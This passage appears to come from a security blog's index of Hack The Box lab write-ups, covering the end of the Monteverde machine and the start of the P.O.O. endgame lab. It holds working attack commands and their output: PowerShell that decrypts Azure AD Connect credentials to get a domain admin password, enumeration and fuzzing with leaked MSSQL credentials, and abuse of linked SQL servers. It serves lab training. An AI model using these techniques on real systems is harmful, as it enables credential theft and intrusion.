database exist:*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; sqlcmd -S localhost -Q \"select name from sys.databases\"name---------------------------------------------------------------------------------------------------------mastertempdbmodelmsdbADSync(5 rows affected)The file line of the string from the blogpost had to be modified with the correct connection string: Data Source=localhost;Database=ADSync;Integrated Security=sspi*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \"Data Source=localhost;Database=ADSync;Integrated Security=sspi\"*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $client.Open()*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $cmd = $client.CreateCommand()*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $cmd.CommandText = \"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration\"*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $reader = $cmd.ExecuteReader()*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $reader.Read() | Out-Null*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $key_id = $reader.GetInt32(0)*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $instance_id = $reader.GetGuid(1)*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $entropy = $reader.GetGuid(2)*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $reader.Close()*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; *Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $cmd = $client.CreateCommand()*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $cmd.CommandText = \"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'\"*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $reader = $cmd.ExecuteReader()*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $reader.Read() | Out-Null*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $config = $reader.GetString(0)*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $crypted = $reader.GetString(1)*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $reader.Close()*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; *Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; add-type -path 'C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll’*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $km.LoadKeySet($entropy, $instance_id, $key_id)*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $key = $null*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $km.GetActiveCredentialKey([ref]$key)*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $key2 = $null*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $km.GetKey(1, [ref]$key2)*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $decrypted = $null*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $key2.DecryptBase64ToString($crypted, [ref]$decrypted)*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $domain = select-xml -Content $config -XPath \"//parameter[@name='forest-login-domain']\" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $username = select-xml -Content $config -XPath \"//parameter[@name='forest-login-user']\" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; $password = select-xml -Content $decrypted -XPath \"//attribute\" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; Write-Host (\"Domain: \" + $domain.Domain)Domain: MEGABANK.LOCAL*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; Write-Host (\"Username: \" + $username.Username)Username: administrator*Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; Write-Host (\"Password: \" + $password.Password)Password: d0m@in4dminyeah!We got the administrator password now: d0m@in4dminyeah!root@kali:~/htb/monteverde# evil-winrm -u administrator -p 'd0m@in4dminyeah!' -i 10.10.10.172Evil-WinRM shell v2.0Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; type ..\\desktop\\root.txt12909612d2[...]"
  },
  
  {
    "title": "P.O.O. - Hack The Box",
    "url": "/posts/htb-writeup-poo/",
    "categories": "hackthebox, infosec",
    "tags": "endgame, ds_store, iis shortname, fuzzing, mssql, linked servers, ipv6, mssql python, hashcat, kerberoast, bloodhound, mimikatz",
    "date": "2020-06-02 00:00:00 +0800",
    





    
    "snippet": "Professional Offensive Operations (P.O.O.) was the first endgame lab released by Hack The Box. It contained five different flags spread across two Windows machines. The initial part required some t...",
    "content": "Professional Offensive Operations (P.O.O.) was the first endgame lab released by Hack The Box. It contained five different flags spread across two Windows machines. The initial part required some tricky recon with ds_store and IIS short names to find a MSSQL DB connection string. We then had to pivot by abusing the trust between MSSQL linked servers. The lab also had kerberoasting, password cracking, mimikatz and attack path enumeration with Bloodhound. The writeup is a somewhat rough compilation of my notes when I initially did it so some stuff might have changed a little bit since it was first released.Portscanroot@kali:~/hackthebox# nmap -F -sC -sV 10.13.38.11Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-02 21:53 EDTNmap scan report for 10.13.38.11Host is up (0.099s latency).Not shown: 98 filtered portsPORT     STATE SERVICE  VERSION80/tcp   open  http     Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Professional Offensive Operations1433/tcp open  ms-sql-s Microsoft SQL Server  14.00.1000.00| ms-sql-ntlm-info: |   Target_Name: POO|   NetBIOS_Domain_Name: POO|   NetBIOS_Computer_Name: COMPATIBILITY|   DNS_Domain_Name: intranet.poo|   DNS_Computer_Name: COMPATIBILITY.intranet.poo|   DNS_Tree_Name: intranet.poo|_  Product_Version: 10.0.14393| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2018-04-02T16:10:49|_Not valid after:  2048-04-02T16:10:49|_ssl-date: 2018-04-03T01:54:00+00:00; -4s from scanner time.Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -4s, deviation: 0s, median: -4s| ms-sql-info: |   10.13.38.11:1433: |     Version: |       name: Microsoft SQL Server |       number: 14.00.1000.00|       Product: Microsoft SQL Server |_    TCP port: 1433Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.78 secondsDirbustingroot@kali:~# gobuster -u 10.13.38.11 -w SecLists/Discovery/Web_Content/raft-large-directories-lowercase.txt -t 50 -s 200,204,301,302,401Gobuster v1.2                OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://10.13.38.11/[+] Threads      : 50[+] Wordlist     : SecLists/Discovery/Web_Content/raft-large-directories-lowercase.txt[+] Status codes : 302,401,200,204,301=====================================================/images (Status: 301)/admin (Status: 401)/templates (Status: 301)/js (Status: 301)/themes (Status: 301)/plugins (Status: 301)/uploads (Status: 301)/dev (Status: 301)/widgets (Status: 301)/meta-inf (Status: 301)/new folder (Status: 301)=====================================================There’s an /admin page… but I can’t brute force it though….DS_Store enumerationAfter trying a couple of wordlists I found a .ds_store file. The .ds_store files left in the directories can help us determine the directory structure of the website such as finding a few hidden directories that we couldn’t find with the gobuster wordlists.Tool used: https://github.com/lijiejie/ds_store_exproot@kali:~/ds_store_exp# python ds_store_exp.py http://10.13.38.11/.DS_Store[+] http://10.13.38.11/.DS_Store[+] http://10.13.38.11/Widgets/.DS_Store[+] http://10.13.38.11/dev/.DS_Store[Folder Found] http://10.13.38.11/Templates[Folder Found] http://10.13.38.11/Widgets[+] http://10.13.38.11/JS/.DS_Store[+] http://10.13.38.11/Themes/.DS_Store[Folder Found] http://10.13.38.11/dev[Folder Found] http://10.13.38.11/JS[Folder Found] http://10.13.38.11/Themes[+] http://10.13.38.11/Images/.DS_Store[Folder Found] http://10.13.38.11/Uploads[Folder Found] http://10.13.38.11/Plugins[+] http://10.13.38.11/iisstart.htm[Folder Found] http://10.13.38.11/Images[Folder Found] http://10.13.38.11/META-INF[+] http://10.13.38.11/Widgets/Framework/.DS_Store[Folder Found] http://10.13.38.11/Widgets/Menu[+] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/.DS_Store[Folder Found] http://10.13.38.11/Widgets/Framework[+] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/.DS_Store[Folder Found] http://10.13.38.11/Widgets/Notifications[Folder Found] http://10.13.38.11/Widgets/CalendarEvents[Folder Found] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc[Folder Found] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1[Folder Found] http://10.13.38.11/JS/custom[Folder Found] http://10.13.38.11/Themes/default[+] http://10.13.38.11/Widgets/Framework/Layouts/.DS_Store[Folder Found] http://10.13.38.11/Images/buttons[Folder Found] http://10.13.38.11/Images/icons[Folder Found] http://10.13.38.11/Widgets/Framework/Layouts[+] http://10.13.38.11/Images/iisstart.png[Folder Found] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/core[Folder Found] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db[Folder Found] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/include[Folder Found] http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/src[Folder Found] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/core[Folder Found] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/include[Folder Found] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/db[Folder Found] http://10.13.38.11/Widgets/Framework/Layouts/default[Folder Found] http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/src[Folder Found] http://10.13.38.11/Widgets/Framework/Layouts/customThe /dev directories are hashes of the box creator names:  dca66d38fd916317687e1390a420c3fc -&gt; eks  304c0c90fbc6520610abbf378e2339d1 -&gt; mrb3nThe /core, /src, /include, and /db directories under /dev/304c0c90fbc6520610abbf378e2339d1 look interesting but after enumeration we didn’t find anything using gobuster.IIS short name enumerationBecause this is a Windows server it supports shortnames for backward compatibility with DOS. We can scan for those files and even though we can’t read them using the 8.3 name it’ll give us the first few letters of the filename and we can guess/fuzz the rest.Tool used: https://github.com/lijiejie/IIS_shortname_Scannerroot@kali:~/IIS_shortname_Scanner# python iis_shortname_Scan.py http://10.13.38.11Server is vulnerable, please wait, scanning...[+] /a~1.*\t[scan in progress][+] /d~1.*\t[scan in progress][+] /n~1.*\t[scan in progress][+] /t~1.*\t[scan in progress][+] /p~1.*\t[scan in progress][+] /s~1.*\t[scan in progress][+] /w~1.*\t[scan in progress][+] /ds~1.*\t[scan in progress][+] /ar~1.*\t[scan in progress][+] /ne~1.*\t[scan in progress][+] /te~1.*\t[scan in progress][+] /tr~1.*\t[scan in progress][+] /tu~1.*\t[scan in progress][+] /pu~1.*\t[scan in progress][+] /sn~1.*\t[scan in progress][+] /we~1.*\t[scan in progress][+] /ds_~1.*\t[scan in progress][+] /ark~1.*\t[scan in progress][+] /new~1.*\t[scan in progress][+] /tem~1.*\t[scan in progress][+] /tra~1.*\t[scan in progress][+] /pup~1.*\t[scan in progress][+] /tun~1.*\t[scan in progress][+] /sna~1.*\t[scan in progress][+] /web~1.*\t[scan in progress][+] /ds_s~1.*\t[scan in progress][+] /arka~1.*\t[scan in progress][+] /newf~1.*\t[scan in progress][+] /temp~1.*\t[scan in progress][+] /tras~1.*\t[scan in progress][+] /pupp~1.*\t[scan in progress][+] /tunn~1.*\t[scan in progress][+] /snad~1.*\t[scan in progress][+] /ds_st~1.*\t[scan in progress][+] /arkan~1.*\t[scan in progress][+] /newfo~1.*\t[scan in progress][+] /templ~1.*\t[scan in progress][+] /trash~1.*\t[scan in progress][+] /puppa~1.*\t[scan in progress][+] /tunne~1.*\t[scan in progress][+] /snado~1.*\t[scan in progress][+] /ds_sto~1.*\t[scan in progress][+] /arkant~1.*\t[scan in progress][+] /templa~1.*\t[scan in progress][+] /trashe~1.*\t[scan in progress][+] /newfol~1.*\t[scan in progress][+] /puppa2~1.*\t[scan in progress][+] /tunnel~1.*\t[scan in progress][+] /ds_sto~1\t[scan in progress][+] Directory /ds_sto~1\t[Done][+] /arkant~1.a*\t[scan in progress][+] /snado_~1.*\t[scan in progress][+] /templa~1\t[scan in progress][+] Directory /templa~1\t[Done][+] /trashe~1\t[scan in progress][+] Directory /trashe~1\t[Done][+] /newfol~1\t[scan in progress][+] Directory /newfol~1\t[Done][+] /puppa2~1.a*\t[scan in progress][+] /tunnel~1.a*\t[scan in progress][+] /arkant~1.as*\t[scan in progress][+] /snado_~1.t*\t[scan in progress][+] /puppa2~1.as*\t[scan in progress][+] /tunnel~1.as*\t[scan in progress][+] /arkant~1.asp*\t[scan in progress][+] File /arkant~1.asp*\t[Done][+] /snado_~1.tx*\t[scan in progress][+] /puppa2~1.asp*\t[scan in progress][+] File /puppa2~1.asp*\t[Done][+] /tunnel~1.ash*\t[scan in progress][+] File /tunnel~1.ash*\t[Done][+] /tunnel~1.asp*\t[scan in progress][+] File /tunnel~1.asp*\t[Done][+] /snado_~1.txt*\t[scan in progress][+] File /snado_~1.txt*\t[Done]----------------------------------------------------------------Dir:  /ds_sto~1Dir:  /templa~1Dir:  /trashe~1Dir:  /newfol~1File: /arkant~1.asp*File: /puppa2~1.asp*File: /tunnel~1.ash*File: /tunnel~1.asp*File: /snado_~1.txt*----------------------------------------------------------------4 Directories, 5 Files found in totalNote that * is a wildcard, matches any character zero or more times.Nothing interesting in the main directory. The .asp files are leftover from other teams.Let’s check those folders we found with the ds_store scanner:root@kali:~/IIS_shortname_Scanner# python iis_shortname_Scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fcServer is vulnerable, please wait, scanning...[+] /dev/dca66d38fd916317687e1390a420c3fc/p~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/d~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/ds~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/pu~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/pup~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/ds_~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/pupp~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/ds_s~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/puppa~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/ds_st~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/ds_sto~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/ds_sto~1\t[scan in progress][+] Directory /dev/dca66d38fd916317687e1390a420c3fc/ds_sto~1\t[Done]----------------------------------------------------------------Dir:  /dev/dca66d38fd916317687e1390a420c3fc/ds_sto~1----------------------------------------------------------------1 Directories, 0 Files found in totalNote that * is a wildcard, matches any character zero or more times.root@kali:~/IIS_shortname_Scanner# python iis_shortname_Scan.py http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1Server is vulnerable, please wait, scanning...[+] /dev/304c0c90fbc6520610abbf378e2339d1/d~1.*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/ds~1.*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_~1.*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_s~1.*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_st~1.*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_sto~1.*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/ds_sto~1\t[scan in progress][+] Directory /dev/304c0c90fbc6520610abbf378e2339d1/ds_sto~1\t[Done]----------------------------------------------------------------Dir:  /dev/304c0c90fbc6520610abbf378e2339d1/ds_sto~1----------------------------------------------------------------1 Directories, 0 Files found in totalNote that * is a wildcard, matches any character zero or more times.root@kali:~/IIS_shortname_Scanner# python iis_shortname_Scan.py http://10.13.38.11/dev/304c0c90fbc6520610abbf378e2339d1/dbServer is vulnerable, please wait, scanning...[+] /dev/304c0c90fbc6520610abbf378e2339d1/db/p~1.*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/db/po~1.*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo~1.*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_~1.*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_c~1.*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.t*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.tx*\t[scan in progress][+] /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt*\t[scan in progress][+] File /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt*\t[Done]----------------------------------------------------------------File: /dev/304c0c90fbc6520610abbf378e2339d1/db/poo_co~1.txt*----------------------------------------------------------------0 Directories, 1 Files found in totalNote that * is a wildcard, matches any character zero or more times.root@kali:~/IIS_shortname_Scanner# python iis_shortname_Scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/dbServer is vulnerable, please wait, scanning...[+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx*\t[scan in progress][+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*\t[scan in progress][+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*\t[Done]----------------------------------------------------------------File: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*----------------------------------------------------------------0 Directories, 1 Files found in totalNote that * is a wildcard, matches any character zero or more times.We found a file that starts with poo_co, but we need to get the rest of the filename using some fuzzing.We’ll take the english dictionary and keep only the words that start with co, then use wfuzz to scan the directory:root@kali:~/SecLists# egrep \"^co\" words.txt &gt; ../co.txtroot@kali:~/SecLists# cd ..root@kali:~# wfuzz -z file,co.txt --hc 404 http://10.13.38.11//dev/304c0c90fbc6520610abbf378e2339d1/db/poo_FUZZ.txtSuccess! There’s a file called poo_connection.txt in the folder containg our first flag and MSSQL credentials:SERVER=10.13.38.11USERID=external_userDBNAME=POO_PUBLICUSERPWD=#p00Public3xt3rnalUs3r#Flag : POO{fcfb0767f5bd3c...}First flag: POO{fcfb0767f5bd3c...}MSSQL enumerationThere’s no CVE on this server, it’s running the latest patched MSSQL.msf auxiliary(admin/mssql/mssql_enum) &gt; run[*] 10.13.38.11:1433 - Running MS SQL Server Enumeration...[*] 10.13.38.11:1433 - Version:[*]\tMicrosoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) [*]\t\tAug 22 2017 17:04:49 [*]\t\tCopyright (C) 2017 Microsoft Corporation[*]\t\tStandard Edition (64-bit) on Windows Server 2016 Standard 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)[*] 10.13.38.11:1433 - Configuration Parameters:[*] 10.13.38.11:1433 - \tC2 Audit Mode is Not Enabled[*] 10.13.38.11:1433 - \txp_cmdshell is Enabled[*] 10.13.38.11:1433 - \tremote access is Enabled[*] 10.13.38.11:1433 - \tallow updates is Not Enabled[*] 10.13.38.11:1433 - \tDatabase Mail XPs is Not Enabled[*] 10.13.38.11:1433 - \tOle Automation Procedures are Enabled[*] 10.13.38.11:1433 - Databases on the server:[*] 10.13.38.11:1433 - \tDatabase name:master[*] 10.13.38.11:1433 - \tDatabase Files for master:[*] 10.13.38.11:1433 - \t\tC:\\Program Files\\Microsoft SQL Server\\MSSQL14.POO_PUBLIC\\MSSQL\\DATA\\master.mdf[*] 10.13.38.11:1433 - \t\tC:\\Program Files\\Microsoft SQL Server\\MSSQL14.POO_PUBLIC\\MSSQL\\DATA\\mastlog.ldf[*] 10.13.38.11:1433 - \tDatabase name:tempdb[*] 10.13.38.11:1433 - \tDatabase Files for tempdb:[*] 10.13.38.11:1433 - \t\tC:\\Program Files\\Microsoft SQL Server\\MSSQL14.POO_PUBLIC\\MSSQL\\DATA\\tempdb.mdf[*] 10.13.38.11:1433 - \t\tC:\\Program Files\\Microsoft SQL Server\\MSSQL14.POO_PUBLIC\\MSSQL\\DATA\\templog.ldf[*] 10.13.38.11:1433 - \t\tC:\\Program Files\\Microsoft SQL Server\\MSSQL14.POO_PUBLIC\\MSSQL\\DATA\\tempdb_mssql_2.ndf[*] 10.13.38.11:1433 - \t\tC:\\Program Files\\Microsoft SQL Server\\MSSQL14.POO_PUBLIC\\MSSQL\\DATA\\tempdb_mssql_3.ndf[*] 10.13.38.11:1433 - \t\tC:\\Program Files\\Microsoft SQL Server\\MSSQL14.POO_PUBLIC\\MSSQL\\DATA\\tempdb_mssql_4.ndf[*] 10.13.38.11:1433 - \tDatabase name:POO_PUBLIC[*] 10.13.38.11:1433 - \tDatabase Files for POO_PUBLIC:[*] 10.13.38.11:1433 - \t\tC:\\Program Files\\Microsoft SQL Server\\MSSQL14.POO_PUBLIC\\MSSQL\\DATA\\poo_public_dat.mdf[*] 10.13.38.11:1433 - \t\tC:\\Program Files\\Microsoft SQL Server\\MSSQL14.POO_PUBLIC\\MSSQL\\DATA\\poo_public_log.ldf[*] 10.13.38.11:1433 - System Logins on this Server:[*] 10.13.38.11:1433 - \tsa[*] 10.13.38.11:1433 - \texternal_user[*] 10.13.38.11:1433 - Disabled Accounts:[*] 10.13.38.11:1433 - \tNo Disabled Logins Found[*] 10.13.38.11:1433 - No Accounts Policy is set for:[*] 10.13.38.11:1433 - \tAll System Accounts have the Windows Account Policy Applied to them.[*] 10.13.38.11:1433 - Password Expiration is not checked for:[*] 10.13.38.11:1433 - \tsa[*] 10.13.38.11:1433 - \texternal_user[*] 10.13.38.11:1433 - System Admin Logins on this Server:[*] 10.13.38.11:1433 - \tsa[*] 10.13.38.11:1433 - Windows Logins on this Server:[*] 10.13.38.11:1433 - \tNo Windows logins found![*] 10.13.38.11:1433 - Windows Groups that can logins on this Server:[*] 10.13.38.11:1433 - \tNo Windows Groups where found with permission to login to system.[*] 10.13.38.11:1433 - Accounts with Username and Password being the same:[*] 10.13.38.11:1433 - \tNo Account with its password being the same as its username was found.[*] 10.13.38.11:1433 - Accounts with empty password:[*] 10.13.38.11:1433 - \tNo Accounts with empty passwords where found.[*] 10.13.38.11:1433 - Stored Procedures with Public Execute Permission found:[*] 10.13.38.11:1433 - \tsp_replsetsyncstatus[*] 10.13.38.11:1433 - \tsp_replcounters[*] 10.13.38.11:1433 - \tsp_replsendtoqueue[*] 10.13.38.11:1433 - \tsp_resyncexecutesql[*] 10.13.38.11:1433 - \tsp_prepexecrpc[*] 10.13.38.11:1433 - \tsp_repltrans[*] 10.13.38.11:1433 - \tsp_xml_preparedocument[*] 10.13.38.11:1433 - \txp_qv[*] 10.13.38.11:1433 - \txp_getnetname[*] 10.13.38.11:1433 - \tsp_releaseschemalock[*] 10.13.38.11:1433 - \tsp_refreshview[*] 10.13.38.11:1433 - \tsp_replcmds[*] 10.13.38.11:1433 - \tsp_unprepare[*] 10.13.38.11:1433 - \tsp_resyncprepare[*] 10.13.38.11:1433 - \tsp_createorphan[*] 10.13.38.11:1433 - \txp_dirtree[*] 10.13.38.11:1433 - \tsp_replwritetovarbin[*] 10.13.38.11:1433 - \tsp_replsetoriginator[*] 10.13.38.11:1433 - \tsp_xml_removedocument[*] 10.13.38.11:1433 - \tsp_repldone[*] 10.13.38.11:1433 - \tsp_reset_connection[*] 10.13.38.11:1433 - \txp_fileexist[*] 10.13.38.11:1433 - \txp_fixeddrives[*] 10.13.38.11:1433 - \tsp_getschemalock[*] 10.13.38.11:1433 - \tsp_prepexec[*] 10.13.38.11:1433 - \txp_revokelogin[*] 10.13.38.11:1433 - \tsp_execute_external_script[*] 10.13.38.11:1433 - \tsp_resyncuniquetable[*] 10.13.38.11:1433 - \tsp_replflush[*] 10.13.38.11:1433 - \tsp_resyncexecute[*] 10.13.38.11:1433 - \txp_grantlogin[*] 10.13.38.11:1433 - \tsp_droporphans[*] 10.13.38.11:1433 - \txp_regread[*] 10.13.38.11:1433 - \tsp_getbindtoken[*] 10.13.38.11:1433 - \tsp_replincrementlsn[*] 10.13.38.11:1433 - Instances found on this server:[*] 10.13.38.11:1433 - Default Server Instance SQL Server Service is running under the privilege of:[*] 10.13.38.11:1433 - \txp_regread might be disabled in this system[*] Auxiliary module execution completedPowerUpSQL and MSSQL linked serversFor the next parts, we’ll use a Windows 10 machine.Since our local attacker machine is not domain joined and we don’t have access to the domain controller, we’ll define the instance manually and test the credentials:PS C:\\Users\\snowscan&gt; $user = \"external_user\"PS C:\\Users\\snowscan&gt; $pass = \"#p00Public3xt3rnalUs3r#\"PS C:\\Users\\snowscan&gt; $i = \"10.13.38.11,1433\"PS C:\\Users\\snowscan&gt; get-sqlservercredential -verbose -instance $i -username $user -password $passVERBOSE: 10.13.38.11,1433 : Connection Success.Next, we start auditing the configuration for weak permissions and such. We find that there is a linked server which we can access.PS C:\\Users\\snowscan&gt; Invoke-SQLAuditPrivServerLink -verbose -instance $i -username $user -password $passVERBOSE: 10.13.38.11,1433 : START VULNERABILITY CHECK: Excessive Privilege - Server LinkVERBOSE: 10.13.38.11,1433 : CONNECTION SUCCESS.VERBOSE: 10.13.38.11,1433 : - The COMPATIBILITY\\POO_CONFIG linked server was found configured with the internal_user login.VERBOSE: 10.13.38.11,1433 : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Server LinkComputerName  : 10.13.38.11Instance      : 10.13.38.11,1433Vulnerability : Excessive Privilege - Linked ServerDescription   : One or more linked servers is preconfigured with alternative credentials which could allow a least privilege login to escalate their privileges on a                remote server.Remediation   : Configure SQL Server links to connect to remote servers using the login's current security context.Severity      : MediumIsVulnerable  : YesIsExploitable : NoExploited     : NoExploitCmd    : Example query: SELECT * FROM OPENQUERY([COMPATIBILITY\\POO_CONFIG],'Select ''Server: '' + @@Servername +'' '' + ''Login: '' + SYSTEM_USER')Details       : The SQL Server link COMPATIBILITY\\POO_CONFIG was found configured with the internal_user login.Reference     : https://msdn.microsoft.com/en-us/library/ms190479.aspxAuthor        : Scott Sutherland (@_nullbind), NetSPI 2016Let’s explore this further:PS C:\\Users\\snowscan&gt; get-sqlserverlink -verbose -instance $i -username $user -password $passVERBOSE: 10.13.38.11,1433 : Connection Success.ComputerName           : 10.13.38.11Instance               : 10.13.38.11,1433DatabaseLinkId         : 0DatabaseLinkName       : COMPATIBILITY\\POO_PUBLICDatabaseLinkLocation   : LocalProduct                : SQL ServerProvider               : SQLNCLICatalog                :LocalLogin             : Uses Self CredentialsRemoteLoginName        :is_rpc_out_enabled     : Trueis_data_access_enabled : Falsemodify_date            : 3/17/2018 1:21:26 PMComputerName           : 10.13.38.11Instance               : 10.13.38.11,1433DatabaseLinkId         : 1DatabaseLinkName       : COMPATIBILITY\\POO_CONFIGDatabaseLinkLocation   : RemoteProduct                : SQL ServerProvider               : SQLNCLICatalog                :LocalLogin             :RemoteLoginName        : internal_useris_rpc_out_enabled     : Trueis_data_access_enabled : Truemodify_date            : 3/17/2018 1:51:08 PMSo using our external_user, we can execute commands as internal_user on the other DB instance POO_CONFIG.The following blog has an interesting technique to exploit trust in linked servers: http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.htmlSo, COMPATIBILITY\\POO_PUBLIC and COMPATIBILITY\\POO_CONFIG are both linked.We can see this using: select * from master..sysserversPS C:\\Users\\snowscan&gt; get-sqlquery -instance $i -username $user -password $pass -query \"select * from master..sysservers\"srvid                : 0srvstatus            : 1089srvname              : COMPATIBILITY\\POO_PUBLICsrvproduct           : SQL Serverprovidername         : SQLOLEDBdatasource           : COMPATIBILITY\\POO_PUBLIClocation             :providerstring       :schemadate           : 3/17/2018 1:21:26 PMtopologyx            : 0topologyy            : 0catalog              :srvcollation         :connecttimeout       : 0querytimeout         : 0srvnetname           : COMPATIBILITY\\POO_PUBLICisremote             : Truerpc                  : Truepub                  : Falsesub                  : Falsedist                 : Falsedpub                 : Falserpcout               : Truedataaccess           : Falsecollationcompatible  : Falsesystem               : Falseuseremotecollation   : Truelazyschemavalidation : Falsecollation            :nonsqlsub            : Falsesrvid                : 1srvstatus            : 1249srvname              : COMPATIBILITY\\POO_CONFIGsrvproduct           : SQL Serverprovidername         : SQLOLEDBdatasource           : COMPATIBILITY\\POO_CONFIGlocation             :providerstring       :schemadate           : 3/17/2018 1:51:08 PMtopologyx            : 0topologyy            : 0catalog              :srvcollation         :connecttimeout       : 0querytimeout         : 